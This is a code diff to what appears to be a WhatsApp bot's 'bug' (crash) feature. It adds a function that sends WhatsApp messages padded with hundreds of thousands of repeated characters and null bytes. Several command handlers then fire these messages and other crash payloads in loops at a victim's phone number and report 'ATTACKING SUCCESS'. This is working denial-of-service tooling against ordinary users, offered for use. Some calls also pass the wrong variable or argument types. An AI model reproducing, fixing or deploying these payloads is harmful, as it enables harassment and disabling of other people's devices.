@@ -48,6 +48,7 @@ const xbug = fs.readFileSync(`./database/image/xbug.jpg`)
 const Xynz = fs.readFileSync(`./database/image/Xynz.jpg`) 
 const zkosong = fs.readFileSync(`./database/image/zkosong.png`)
 const o = fs.readFileSync(`./database/image/o.jpg`)
+const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
 
 const bugres = '𝙋𝙧𝙤𝙘𝙚𝙨𝙨 〽️'
 
@@ -422,6 +423,64 @@ const wanted = {
                 console.log(err);
             }
         }
+        
+async function buginvite(target, ptcp = true) {
+    try {
+        const message = {
+            botInvokeMessage: {
+                message: {
+                    newsletterAdminInviteMessage: {
+                        newsletterJid: `33333333333333333@newsletter`,
+                        newsletterName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "ꦾ".repeat(120000),
+                        jpegThumbnail: "",
+                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
+                        inviteExpiration: Date.now() + 1814400000, // 21 hari
+                    },
+                },
+            },
+            nativeFlowMessage: {
+    messageParamsJson: "",
+    buttons: [
+        {
+            name: "call_permission_request",
+            buttonParamsJson: "{}",
+        },
+        {
+            name: "galaxy_message",
+            paramsJson: {
+                "screen_2_OptIn_0": true,
+                "screen_2_OptIn_1": true,
+                "screen_1_Dropdown_0": "nullOnTop",
+                "screen_1_DatePicker_1": "1028995200000",
+                "screen_1_TextInput_2": "null@gmail.com",
+                "screen_1_TextInput_3": "94643116",
+                "screen_0_TextInput_0": "\u0000".repeat(500000),
+                "screen_0_TextInput_1": "SecretDocu",
+                "screen_0_Dropdown_2": "#926-Xnull",
+                "screen_0_RadioButtonsGroup_3": "0_true",
+                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
+            },
+        },
+    ],
+},
+                     contextInfo: {
+                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
+                groupMentions: [
+                    {
+                        groupJid: "0@s.whatsapp.net",
+                        groupSubject: "viperwzz",
+                    },
+                ],
+            },
+        };
+
+        await viper.relayMessage(target, message, {
+            userJid: target,
+        });
+    } catch (err) {
+        console.error("Error sending newsletter:", err);
+    }
+}
 		
 async function XeonXRobust(target, Ptcp = true) {
 	const jids = `*_~@13135550002~_*\n`.repeat(10000);
@@ -545,7 +604,7 @@ quotedMessage: {
                     footerText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
                     buttons: [
                         {
-                            buttonId: "\u0003".repeat(150000),
+                            buttonId: "\u0003".repeat(180000),
                             buttonText: {
                                 displayText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚"
                             },
@@ -2142,23 +2201,23 @@ if (!q) return reply(`Example: ${prefix + command} 62×××`);
 reply(bugres);
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, target, (cct = true), (Ptcp = true));
+await buginvite(target, { ptcp: true });
 await sleep(1500);
-await buk1(viper, target);
+await buginvite(target, { ptcp: true });
 await sleep(1500);
 sendQP(target, wanted);
 await sleep(1500);
 await sendQP(target, wanted);
 await sleep(1500);
-await beta2(viper, target, (cct = true), (Ptcp = true));
+await XeonXRobustV2(viper, target, (cct = true), (Ptcp = true));
 await sleep(1500);
-await beta2(viper, target)
+await XeonXRobustV2(viper, target)
 await sleep(1500);
 await sendSessionStructure(target, wanted);
 await sleep(1500);
-await beta1(viper, target);
+await XeonXRobust(viper, target);
 await sleep(1500);
-await beta1(viper, target);
+await XeonXRobust(viper, target);
 darkphonk = fs.readFileSync('./database/suki.mp3')
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
@@ -2187,23 +2246,23 @@ var contactInfo = await viper.onWhatsApp(XReturn);
 reply(bugres)
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, XReturn, (cct = true), (Ptcp = true));
+await buginvite(target, { ptcp: true });
 await sleep(1500);
-await buk1(viper, XReturn);
+await buginvite(target, { ptcp: true });
 await sleep(1500);
 sendQP(XReturn, wanted);
 await sleep(1500);
 await sendQP(XReturn, wanted);
 await sleep(1500);
-await beta2(viper, XReturn, (cct = true), (Ptcp = true));
+await XeonXRobustV2(viper, XReturn, (cct = true), (Ptcp = true));
 await sleep(1500);
-await beta2(viper, XReturn)
+await XeonXRobustV2(viper, XReturn)
 await sleep(1500);
 await sendSessionStructure(XReturn, wanted);
 await sleep(1500);
-await beta1(viper, XReturn);
+await XeonXRobust(viper, XReturn);
 await sleep(1500);
-await beta1(viper, XReturn);
+await XeonXRobust(viper, XReturn);
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
@@ -2233,23 +2292,23 @@ var contactInfo = await viper.onWhatsApp(XReturn);
 reply(bugres)
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, XReturn, (cct = true), (Ptcp = true));
+await buginvite(target, { ptcp: true });
 await sleep(1500);
-await buk1(viper, XReturn);
+await buginvite(target, { ptcp: true });
 await sleep(1500);
 sendQP(XReturn, wanted);
 await sleep(1500);
 await sendQP(XReturn, wanted);
 await sleep(1500);
-await beta2(viper, XReturn, (cct = true), (Ptcp = true));
+await XeonXRobustV2(viper, XReturn, (cct = true), (Ptcp = true));
 await sleep(1500);
-await beta2(viper, XReturn)
+await XeonXRobustV2(viper, XReturn)
 await sleep(1500);
 await sendSessionStructure(XReturn, wanted);
 await sleep(1500);
-await beta1(viper, XReturn);
+await XeonXRobust(viper, XReturn);
 await sleep(1500);
-await beta1(viper, XReturn);
+await XeonXRobust(viper, XReturn);
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
@@ -2279,11 +2338,11 @@ var contactInfo = await viper.onWhatsApp(XReturn);
 reply(bugres)
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, XReturn, "Punten", 1020000, Ptcp = true);
+await buginvite(target, { ptcp: true });
 await sendQP(XReturn, wanted)
-await beta2(viper, XReturn, wanted)
+await XeonXRobustV2(viper, XReturn, wanted)
 await sendSessionStructure(XReturn, wanted)
-await beta1(viper, XReturn, wanted)
+await XeonXRobust(viper, XReturn, wanted)
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
@@ -2313,23 +2372,23 @@ var contactInfo = await viper.onWhatsApp(XReturn);
 reply(bugres)
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, XReturn, (cct = true), (Ptcp = true));
+await buginvite(target, { ptcp: true });
 await sleep(1500);
-await buk1(viper, XReturn);
+await buginvite(target, { ptcp: true });
 await sleep(1500);
 sendQP(XReturn, wanted);
 await sleep(1500);
 await sendQP(XReturn, wanted);
 await sleep(1500);
-await beta2(viper, XReturn, (cct = true), (Ptcp = true));
+await XeonXRobustV2(viper, XReturn, (cct = true), (Ptcp = true));
 await sleep(1500);
-await beta2(viper, XReturn)
+await XeonXRobustV2(viper, XReturn)
 await sleep(1500);
 await sendSessionStructure(XReturn, wanted);
 await sleep(1500);
-await beta1(viper, XReturn);
+await XeonXRobust(viper, XReturn);
 await sleep(1500);
-await beta1(viper, XReturn);
+await XeonXRobust(viper, XReturn);
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
